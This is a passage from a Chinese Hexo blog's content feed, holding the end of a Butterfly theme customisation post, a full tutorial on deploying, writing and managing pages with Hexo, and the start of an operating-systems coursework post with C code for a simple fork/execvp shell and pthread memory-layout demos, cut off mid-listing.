class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel="stylesheet"</span> <span class="string">href="/css/custom.css"&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src="/js/custom.js"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="12-2-custom-css（建议从这个起步）"><a href="#12-2-custom-css（建议从这个起步）" class="headerlink" title="12.2 custom.css（建议从这个起步）"></a>12.2 custom.css（建议从这个起步）</h3><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* 全局圆角与阴影（更“卡片化”） */</span></span><br><span class="line"><span class="selector-class">.card-widget</span>,</span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">35px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">08</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正文更易读 */</span></span><br><span class="line"><span class="selector-class">.post-content</span> {</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.85</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 图片统一风格 */</span></span><br><span class="line"><span class="selector-class">.post-content</span> <span class="selector-tag">img</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">30px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">12</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="13-结语：写给未来的自己"><a href="#13-结语：写给未来的自己" class="headerlink" title="13. 结语：写给未来的自己"></a>13. 结语：写给未来的自己</h2><ul><li><strong>美化不是一次性工程</strong>：先把“基础观感”打到 80 分，再慢慢加功能与细节。</li><li>遇到改不动/改崩了：先 <code>git diff</code> 看改了啥；再 <code>hexo clean &amp;&amp; hexo s</code> 排查。</li><li>Butterfly 的配置项多但很强，遇到不确定的项，优先查官方文档与仓库说明。(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</li></ul><hr><h2 id="参考资料（建议收藏）"><a href="#参考资料（建议收藏）" class="headerlink" title="参考资料（建议收藏）"></a>参考资料（建议收藏）</h2><ul><li>Butterfly 官方文档站点与 Get Started（安装、升级建议、配置入口）(<a href="https://butterfly.js.org/?utm_source=chatgpt.com" title="Butterfly - A Simple and Card UI Design theme for Hexo">Butterfly</a>)</li><li>Butterfly GitHub 仓库（版本、更新、Issues）(<a href="https://github.com/jerryc127/hexo-theme-butterfly?utm_source=chatgpt.com" title="GitHub - jerryc127/hexo-theme-butterfly: A Hexo Theme: Butterfly">GitHub</a>)</li><li>社区美化与配置实践（可抄作思路，但注意与你的版本差异）(<a href="https://blog.r1ce.cn/aa98fabcce67/?utm_source=chatgpt.com" title="Hexo博客之Butterfly主题配置及美化 | Yime's Blog">Yime’s Blog</a>)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客日常维护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客日常使用完整教程</title>
      <link href="/2026/01/29/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E6%95%99%E7%A8%8B/"/>
      <url>/2026/01/29/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-博客日常使用完整教程（部署-写作-页面管理）"><a href="#Hexo-博客日常使用完整教程（部署-写作-页面管理）" class="headerlink" title="Hexo 博客日常使用完整教程（部署 / 写作 / 页面管理）"></a>Hexo 博客日常使用完整教程（部署 / 写作 / 页面管理）</h1><blockquote><p>本文用于解决一个<strong>非常真实的问题</strong>：<br>👉「Hexo 放了一段时间没用，又忘了该怎么操作」  </p><p>内容涵盖 <strong>部署到 GitHub、写文章、新建页面、日常维护</strong>，<br>建议长期保留在博客中，作为个人 Hexo 使用手册。</p></blockquote><hr><h2 id="一、最重要的事：如何同步到-GitHub（必背）"><a href="#一、最重要的事：如何同步到-GitHub（必背）" class="headerlink" title="一、最重要的事：如何同步到 GitHub（必背）"></a>一、最重要的事：如何同步到 GitHub（必背）</h2><h3 id="✅-一行命令解决-90-场景"><a href="#✅-一行命令解决-90-场景" class="headerlink" title="✅ 一行命令解决 90% 场景"></a>✅ 一行命令解决 90% 场景</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo d -g</span><br></pre></td></tr></tbody></table></figure><p>含义：</p><ul><li><code>hexo g</code>：生成静态文件</li><li><code>hexo d</code>：部署到 GitHub Pages</li><li><code>-g</code>：部署前自动生成</li></ul><p>👉 <strong>写完博客 = 执行这条命令</strong></p><hr><h2 id="二、推荐的完整部署流程（稳妥版）"><a href="#二、推荐的完整部署流程（稳妥版）" class="headerlink" title="二、推荐的完整部署流程（稳妥版）"></a>二、推荐的完整部署流程（稳妥版）</h2><p>当页面异常、样式没更新时，使用完整流程：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>或简写：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="三、本地预览博客（强烈推荐）"><a href="#三、本地预览博客（强烈推荐）" class="headerlink" title="三、本地预览博客（强烈推荐）"></a>三、本地预览博客（强烈推荐）</h2><p>在部署前，先本地看看效果：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></tbody></table></figure><p>或：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></tbody></table></figure><p>访问：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost:4000</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="四、新建文章（最常用）"><a href="#四、新建文章（最常用）" class="headerlink" title="四、新建文章（最常用）"></a>四、新建文章（最常用）</h2><h3 id="1️⃣-新建一篇文章"><a href="#1️⃣-新建一篇文章" class="headerlink" title="1️⃣ 新建一篇文章"></a>1️⃣ 新建一篇文章</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new 文章标题</span><br></pre></td></tr></tbody></table></figure><p>例如：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new Hexo使用教程</span><br></pre></td></tr></tbody></table></figure><p>生成文件位置：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">source/_posts/Hexo使用教程.md</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-新建指定类型的文章（如-post）"><a href="#2️⃣-新建指定类型的文章（如-post）" class="headerlink" title="2️⃣ 新建指定类型的文章（如 post）"></a>2️⃣ 新建指定类型的文章（如 post）</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new post 文章标题</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="3️⃣-文章头部-Front-matter-说明"><a href="#3️⃣-文章头部-Front-matter-说明" class="headerlink" title="3️⃣ 文章头部 Front-matter 说明"></a>3️⃣ 文章头部 Front-matter 说明</h3><p>新文章顶部一般如下：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span> <span class="string">使用教程</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2026-01-29 10:00:00</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">博客</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">技术</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><ul><li><code>title</code>：文章标题</li><li><code>date</code>：发布时间</li><li><code>tags</code>：标签（可多个）</li><li><code>categories</code>：分类（一般一个）</li></ul><hr><h2 id="五、新建页面（关于页-友链页-等）"><a href="#五、新建页面（关于页-友链页-等）" class="headerlink" title="五、新建页面（关于页 / 友链页 等）"></a>五、新建页面（关于页 / 友链页 等）</h2><h3 id="1️⃣-新建一个页面"><a href="#1️⃣-新建一个页面" class="headerlink" title="1️⃣ 新建一个页面"></a>1️⃣ 新建一个页面</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new page 页面名</span><br></pre></td></tr></tbody></table></figure><p>例如新建「关于我」页面：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></tbody></table></figure><p>生成目录：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">source/about/index.md</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-页面和文章的区别"><a href="#2️⃣-页面和文章的区别" class="headerlink" title="2️⃣ 页面和文章的区别"></a>2️⃣ 页面和文章的区别</h3><table><thead><tr><th>类型</th><th>是否出现在首页</th><th>用途</th></tr></thead><tbody><tr><td>文章（post）</td><td>✅ 是</td><td>博客内容</td></tr><tr><td>页面（page）</td><td>❌ 否</td><td>关于 / 友链 / 标签页</td></tr></tbody></table><hr><h2 id="六、常见功能页面（主题相关）"><a href="#六、常见功能页面（主题相关）" class="headerlink" title="六、常见功能页面（主题相关）"></a>六、常见功能页面（主题相关）</h2><blockquote><p>以下页面通常需要主题支持</p></blockquote><h3 id="1️⃣-标签页"><a href="#1️⃣-标签页" class="headerlink" title="1️⃣ 标签页"></a>1️⃣ 标签页</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></tbody></table></figure><p>并在 <code>source/tags/index.md</code> 中添加：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">标签</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">tags</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-分类页"><a href="#2️⃣-分类页" class="headerlink" title="2️⃣ 分类页"></a>2️⃣ 分类页</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></tbody></table></figure><p>内容：</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">categories</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="七、草稿的使用（可选但很实用）"><a href="#七、草稿的使用（可选但很实用）" class="headerlink" title="七、草稿的使用（可选但很实用）"></a>七、草稿的使用（可选但很实用）</h2><h3 id="1️⃣-新建草稿"><a href="#1️⃣-新建草稿" class="headerlink" title="1️⃣ 新建草稿"></a>1️⃣ 新建草稿</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo new draft 草稿名</span><br></pre></td></tr></tbody></table></figure><p>目录：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">source/_drafts/</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-本地预览草稿"><a href="#2️⃣-本地预览草稿" class="headerlink" title="2️⃣ 本地预览草稿"></a>2️⃣ 本地预览草稿</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo s --draft</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="3️⃣-发布草稿"><a href="#3️⃣-发布草稿" class="headerlink" title="3️⃣ 发布草稿"></a>3️⃣ 发布草稿</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo publish 草稿名</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="八、Hexo-常用命令速查表（重点收藏）"><a href="#八、Hexo-常用命令速查表（重点收藏）" class="headerlink" title="八、Hexo 常用命令速查表（重点收藏）"></a>八、Hexo 常用命令速查表（重点收藏）</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">hexo init            <span class="comment"># 初始化博客</span></span><br><span class="line">hexo new             <span class="comment"># 新建文章</span></span><br><span class="line">hexo new page        <span class="comment"># 新建页面</span></span><br><span class="line">hexo new draft       <span class="comment"># 新建草稿</span></span><br><span class="line">hexo publish         <span class="comment"># 发布草稿</span></span><br><span class="line">hexo clean           <span class="comment"># 清理缓存</span></span><br><span class="line">hexo g               <span class="comment"># 生成静态文件</span></span><br><span class="line">hexo s               <span class="comment"># 本地预览</span></span><br><span class="line">hexo d               <span class="comment"># 部署</span></span><br><span class="line">hexo d -g            <span class="comment"># 生成并部署（最常用）</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="九、部署前必要检查（一次配置，长期受用）"><a href="#九、部署前必要检查（一次配置，长期受用）" class="headerlink" title="九、部署前必要检查（一次配置，长期受用）"></a>九、部署前必要检查（一次配置，长期受用）</h2><h3 id="1️⃣-安装-Git-部署插件"><a href="#1️⃣-安装-Git-部署插件" class="headerlink" title="1️⃣ 安装 Git 部署插件"></a>1️⃣ 安装 Git 部署插件</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2️⃣-config-yml-示例"><a href="#2️⃣-config-yml-示例" class="headerlink" title="2️⃣ _config.yml 示例"></a>2️⃣ <code>_config.yml</code> 示例</h3><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/你的用户名/你的用户名.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="十、常见问题备忘（救命清单）"><a href="#十、常见问题备忘（救命清单）" class="headerlink" title="十、常见问题备忘（救命清单）"></a>十、常见问题备忘（救命清单）</h2><ul><li>页面没更新<br>→ <code>hexo clean &amp;&amp; hexo d -g</code></li><li><code>hexo d</code> 报错<br>→ 是否安装 <code>hexo-deployer-git</code></li><li>GitHub Pages 404<br>→ 仓库名是否为 <code>用户名.github.io</code></li><li>样式错乱<br>→ 清缓存 + 重新生成</li></ul><hr><h2 id="十一、一句话总结（写给未来的自己）"><a href="#十一、一句话总结（写给未来的自己）" class="headerlink" title="十一、一句话总结（写给未来的自己）"></a>十一、一句话总结（写给未来的自己）</h2><blockquote><p><strong>Hexo 博客日常流程：</strong></p></blockquote><figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">写文章 → 本地预览 → hexo d -g → 完事</span><br></pre></td></tr></tbody></table></figure><hr><p><strong>如果你多年后再看到这篇文章：<br>恭喜你，已经成功救了自己一次 😄</strong></p>]]></content>
      
      
      <categories>
          
          <category> 博客日常维护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统实验及作业</title>
      <link href="/2025/10/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E5%8F%8A%E4%BD%9C%E4%B8%9A/"/>
      <url>/2025/10/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E5%8F%8A%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="📖-操作系统课程作业"><a href="#📖-操作系统课程作业" class="headerlink" title="📖 操作系统课程作业"></a>📖 操作系统课程作业</h2><h3 id="🧪-实验一源代码"><a href="#🧪-实验一源代码" class="headerlink" title="🧪 实验一源代码"></a>🧪 实验一源代码</h3><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_INPUT 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ARGS 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">    <span class="type">char</span> input[MAX_INPUT];</span><br><span class="line">    <span class="type">char</span> *args[MAX_ARGS];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"myshell20232316dl&gt; "</span>);</span><br><span class="line">        <span class="keyword">if</span> (fgets(input, MAX_INPUT, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) {</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// 处理EOF (Ctrl+D)</span></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 去除换行符</span></span><br><span class="line">        input[<span class="built_in">strcspn</span>(input, <span class="string">"\n"</span>)] = <span class="string">'\0'</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 处理exit命令</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(input, <span class="string">"exit"</span>) == <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 跳过空输入</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(input) == <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 分割输入为命令和参数</span></span><br><span class="line">        <span class="type">char</span> *token;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        token = strtok(input, <span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">while</span>(token != <span class="literal">NULL</span> &amp;&amp; i &lt; MAX_ARGS - <span class="number">1</span>) {</span><br><span class="line">            args[i++] = token;</span><br><span class="line">            token = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">        }</span><br><span class="line">        args[i] = <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建子进程执行命令</span></span><br><span class="line">        pid = fork();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pid &lt; <span class="number">0</span>) {</span><br><span class="line">            perror(<span class="string">"fork failed"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) {</span><br><span class="line">            <span class="comment">// 子进程执行命令</span></span><br><span class="line">            execvp(args[<span class="number">0</span>], args);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 如果execvp返回，说明执行失败</span></span><br><span class="line">            perror(<span class="string">"execvp failed"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// 父进程等待子进程结束</span></span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Child exited with status %d\n"</span>, WEXITSTATUS(status));</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="🌟作业二源代码"><a href="#🌟作业二源代码" class="headerlink" title="🌟作业二源代码"></a>🌟作业二源代码</h3><p>任务一：多线程运行结果记录与分析</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">thread_func</span><span class="params">(<span class="type">void</span>* arg)</span> {</span><br><span class="line">    <span class="type">long</span> id = (<span class="type">long</span>)arg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"线程 %ld 正在运行第 %d 次，线程ID = %lu\n"</span>, id, i, pthread_self());</span><br><span class="line">        usleep(<span class="number">100000</span>); <span class="comment">// 微秒级休眠，制造时间片切换</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"作业二第一部分：\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"主线程开始创建子线程...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> tid[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) {</span><br><span class="line">        pthread_create(&amp;tid[i], <span class="literal">NULL</span>, thread_func, (<span class="type">void</span>*)i);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) pthread_join(tid[i], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"所有线程执行完毕。\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>任务二：进程地址空间分析</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量和函数用于标识不同区段</span></span><br><span class="line"><span class="type">int</span> global_var = <span class="number">10</span>;            <span class="comment">// 数据段</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> const_global = <span class="number">100</span>;   <span class="comment">// 只读数据段</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">code_func</span><span class="params">()</span> {}             <span class="comment">// 代码段</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">show_addr</span><span class="params">(<span class="type">void</span>* arg)</span> {</span><br><span class="line">    <span class="type">int</span> thread_id = *(<span class="type">int</span>*)arg;</span><br><span class="line">    <span class="type">int</span> local_var = <span class="number">20</span>;           <span class="comment">// 栈</span></span><br><span class="line">    <span class="type">int</span>* heap_var = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));  <span class="comment">// 堆</span></span><br><span class="line">    *heap_var = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n===== 线程 %d 的地址空间分布 =====\n"</span>, thread_id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"代码段地址（函数 code_func） ：%p\n"</span>, (<span class="type">void</span>*)code_func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"只读数据段地址（const_global）：%p\n"</span>, (<span class="type">void</span>*)&amp;const_global);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"数据段地址（global_var）      ：%p\n"</span>, (<span class="type">void</span>*)&amp;global_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆区地址（malloc 分配）       ：%p\n"</span>, (<span class="type">void</span>*)heap_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈区地址（local_var）         ：%p\n"</span>, (<span class="type">void</span>*)&amp;local_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 展示堆区共享验证（修改堆区数据）</span></span><br><span class="line">    *heap_var += thread_id;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"线程 %d 修改堆区数据后值为：%d\n"</span>, thread_id, *heap_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 稍作等待以便输出交错显示</span></span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">    <span class="built_in">free</span>(heap_var);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"作业二第二部分：进程地址空间布局分析\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"主线程开始创建两个子线程...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> tid1, tid2;</span><br><span class="line">    <span class="type">int</span> id1 = <span class="number">1</span>, id2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;tid1, <span class="literal">NULL</span>, show_addr, &amp;id1);</span><br><span class="line">    pthread_create(&amp;tid2, <span class="literal">NULL</span>, show_addr, &amp;id2);</span><br><span class="line"></span><br><span class="line">    pthread_join(tid1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n所有线程执行完毕。\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>任务三：堆栈内容展示与分析</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子线程函数：分析堆栈空间布局与增长方向</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span> {</span><br><span class="line">    <span class="type">int</span> thread_id = *(<span class="type">int</span>*)arg;</span><br><span class="line">    <span class="type">int</span> stack_var1, stack_var2;             <span class="comment">// 栈变量</span></span><br><span class="line">    <span class="type">int</span> *heap_var1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));   <span class="comment">// 堆变量1</span></span><br><span class="line">    <span class="type">int</span> *heap_var2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));   <span class="comment">// 堆变量2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n===== 线程 %d 堆栈分析 =====\n"</span>, thread_id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 栈分析</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【栈分析】\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈变量 1 地址: %p\n"</span>, (<span class="type">void</span>*)&amp;stack_var1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈变量 2 地址: %p\n"</span>, (<span class="type">void</span>*)&amp;stack_var2);</span><br><span class="line">    <span class="keyword">if</span> (&amp;stack_var1 &gt; &amp;stack_var2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈空间向低地址方向增长\n"</span>);</span><br><span class="line">    